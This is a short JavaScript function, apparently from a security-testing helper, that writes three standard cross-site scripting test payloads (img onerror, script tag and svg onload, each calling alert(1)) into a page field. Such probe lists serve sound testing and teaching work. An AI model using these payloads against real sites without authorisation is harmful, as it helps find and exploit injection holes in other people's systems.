function generatePayloads() {
  const payloads = [
    '<img src=x onerror=alert(1)>',
    '<script>alert(1)</script>',
    '"><svg/onload=alert(1)>'
  ];
  document.getElementById('payloads').value = payloads.join('\n');
}
